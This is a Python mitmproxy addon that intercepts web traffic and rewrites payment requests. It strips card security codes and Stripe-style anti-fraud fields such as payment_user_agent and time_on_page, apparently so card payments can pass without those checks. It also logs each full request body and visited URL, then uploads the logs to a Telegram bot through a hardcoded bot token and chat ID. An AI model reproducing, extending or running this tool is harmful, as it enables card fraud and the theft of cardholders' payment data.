from mitmproxy import http, ctx
import re
import json
import os
from datetime import datetime
import requests

# Telegram bot token and chat ID
TELEGRAM_BOT_TOKEN = "7303019941:AAHAzi3lU1R6IU6k8L7ERqM3XPbCwbkDOxY"
TELEGRAM_CHAT_ID = "6460703454"

# Precompiled regex patterns for CVV and other sensitive data
REGEX_PATTERNS = [
    re.compile(rb"payment_method_data\[card\]\[cvc\]=[\d]{3,4}"),
    re.compile(rb"card\[cvc\]=[\d]{3,4}"),
    re.compile(rb"source_data\[card\]\[cvc\]=[\d]{3,4}"),
    re.compile(rb"encryptedSecurityCode\":\s*\"[^\"]+\""),
    re.compile(rb"\"cvv\":\s*\"[\d]{3,4}\""),
    re.compile(rb"cc_cscv=[\d]{3,4}"),
    re.compile(rb"card\[cvv\]=[\d]{3,4}"),
    re.compile(rb"card\[cvv2\]=[\d]{3,4}"),
    re.compile(rb"security_code=[\d]{3,4}"),
    re.compile(rb"securityCode=[\d]{3,4}"),
    re.compile(rb"cvvNumber=[\d]{3,4}"),
    re.compile(rb"card_verification_value=[\d]{3,4}"),
    re.compile(rb"cvc2=[\d]{3,4}"),
    re.compile(rb"cvv_code=[\d]{3,4}"),
    re.compile(rb"csc=[\d]{3,4}"),
    re.compile(rb"cvn=[\d]{3,4}"),
    re.compile(rb"cvv_field=[\d]{3,4}"),
    re.compile(rb"cvc_code=[\d]{3,4}"),
    re.compile(rb"securityNumber=[\d]{3,4}"),
    re.compile(rb"verification_code=[\d]{3,4}"),
    re.compile(rb"verificationCode=[\d]{3,4}"),
    re.compile(rb"card_security_code=[\d]{3,4}"),
    re.compile(rb"cardSecurityCode=[\d]{3,4}"),
    re.compile(rb"cardCvc=[\d]{3,4}"),
    re.compile(rb"cardCvv=[\d]{3,4}"),
    re.compile(rb"cvvValue=[\d]{3,4}"),
    re.compile(rb"cvcValue=[\d]{3,4}"),
    re.compile(rb"cvv_field_value=[\d]{3,4}"),
    re.compile(rb"cvc_field_value=[\d]{3,4}"),
    re.compile(rb"cardVerificationCode=[\d]{3,4}"),
    re.compile(rb"cvcNumber=[\d]{3,4}"),
    re.compile(rb"cvv_num=[\d]{3,4}"),
    re.compile(rb"cvc_num=[\d]{3,4}"),
    re.compile(rb"payment_method_data\[payment_user_agent\]=[^&]*"),
    re.compile(rb"payment_method_data\[time_on_page\]=[^&]*"),
    re.compile(rb"payment_method_data\[pasted_fields\]=[^&]*"),
    re.compile(rb"payment_user_agent=[^&]*"),
    re.compile(rb"pasted_fields=[^&]*"),
    re.compile(rb"time_on_page=[^&]*"),
    re.compile(rb"source_data\[pasted_fields\]=[^&]*"),
    re.compile(rb"source_data\[payment_user_agent\]=[^&]*")
]

LOG_FILE_PATH = "request_logs.json"
URL_LOG_FILE_PATH = "url_logs.txt"

def log_to_file(log_data):
    """
    Logs the data to a JSON file.
    """
    if not os.path.exists(LOG_FILE_PATH):
        with open(LOG_FILE_PATH, 'w') as log_file:
            json.dump([], log_file)

    with open(LOG_FILE_PATH, 'r+') as log_file:
        logs = json.load(log_file)
        logs.append(log_data)
        log_file.seek(0)
        json.dump(logs, log_file, indent=4)

def log_request_body(flow: http.HTTPFlow, message: str):
    """
    Logs the request body to a JSON file for debugging purposes.
    """
    log_data = {
        "timestamp": datetime.now().isoformat(),
        "message": message,
        "request_body": flow.request.content.decode('utf-8', errors='ignore')
    }
    log_to_file(log_data)
    ctx.log.info(f"{message} logged to {LOG_FILE_PATH}")

def log_url(flow: http.HTTPFlow):
    """
    Logs the URL to a text file.
    """
    with open(URL_LOG_FILE_PATH, 'a') as url_log_file:
        url_log_file.write(f"{datetime.now().isoformat()} - {flow.request.pretty_url}\n")
    ctx.log.info(f"URL logged to {URL_LOG_FILE_PATH}")

def clean_up_trailing_characters(request_body: bytes) -> bytes:
    """
    Cleans up trailing commas and quotes left behind after removing CVV values and other specified fields.
    """
    patterns = [
        re.compile(rb",\s*\"[^\"]*\":\s*\"\""),
        re.compile(rb"&\s*payment_method_data\[payment_user_agent\]=[^&]*"),
        re.compile(rb"&\s*payment_method_data\[time_on_page\]=[^&]*"),
        re.compile(rb"&\s*payment_method_data\[pasted_fields\]=[^&]*"),
        re.compile(rb"&\s*payment_user_agent=[^&]*"),
        re.compile(rb"&\s*pasted_fields=[^&]*"),
        re.compile(rb"&\s*time_on_page=[^&]*"),
        re.compile(rb"&\s*source_data\[pasted_fields\]=[^&]*"),
        re.compile(rb"&\s*source_data\[payment_user_agent\]=[^&]*"),
        re.compile(rb"&\s*source_data\[time_on_page\]=[^&]*")
    ]
    for pattern in patterns:
        request_body = pattern.sub(b"", request_body)
    return request_body

def remove_patterns_from_request_body(request_body: bytes, patterns) -> (bytes, bool):
    """
    Removes specified patterns from the request body based on the patterns.
    Returns the modified request body and a flag indicating if any sensitive data was removed.
    """
    data_removed = False
    for pattern in patterns:
        if pattern.search(request_body):
            data_removed = True
            request_body = pattern.sub(b"", request_body)
    return request_body, data_removed

def send_telegram_notification(message: str):
    """
    Sends a notification to the Telegram bot.
    """
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message
    }
    try:
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            ctx.log.info("Notification sent successfully")
        else:
            ctx.log.error(f"Failed to send notification: {response.status_code} {response.text}")
    except Exception as e:
        ctx.log.error(f"Error sending notification: {e}")

def send_log_file():
    """
    Sends the log file to the Telegram bot.
    """
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    with open(LOG_FILE_PATH, 'rb') as log_file:
        files = {'document': log_file}
        data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': 'Request log file'}
        try:
            response = requests.post(url, data=data, files=files)
            if response.status_code == 200:
                ctx.log.info("Log file sent successfully")
            else:
                ctx.log.error(f"Failed to send log file: {response.status_code} {response.text}")
        except Exception as e:
            ctx.log.error(f"Error sending log file: {e}")

def send_url_log_file():
    """
    Sends the URL log file to the Telegram bot.
    """
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    with open(URL_LOG_FILE_PATH, 'rb') as url_log_file:
        files = {'document': url_log_file}
        data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': 'URL log file'}
        try:
            response = requests.post(url, data=data, files=files)
            if response.status_code == 200:
                ctx.log.info("URL log file sent successfully")
            else:
                ctx.log.error(f"Failed to send URL log file: {response.status_code} {response.text}")
        except Exception as e:
            ctx.log.error(f"Error sending URL log file: {e}")

def modify_request(flow: http.HTTPFlow):
    """
    Modifies the intercepted request to remove CVV data, payment user agent, and other specified fields.
    """
    log_request_body(flow, "Original Request Body")
    log_url(flow)
    # Remove CVV codes and other sensitive data from the request data
    modified_body, data_removed = remove_patterns_from_request_body(flow.request.content, REGEX_PATTERNS)
    if data_removed:
        send_telegram_notification("Sensitive data removed from request")
        send_log_file()
        send_url_log_file()

    # Clean up any trailing characters if necessary
    modified_body = clean_up_trailing_characters(modified_body)

    # Log the modified request data for debugging
    if data_removed:
        log_request_body(flow, "Modified Request Body")

    # Set the modified body back to the request
    flow.request.content = modified_body

def request(flow: http.HTTPFlow):
    """
    This function intercepts and modifies requests to remove CVV data, payment user agent, and other specified fields.
    """
    modify_request(flow)

def start():
    """
    Function executed when the proxy starts.
    """
    ctx.log.info("Proxy server started. Ready to intercept requests.")

# Attach handlers to mitmproxy
addons = [
    request
]
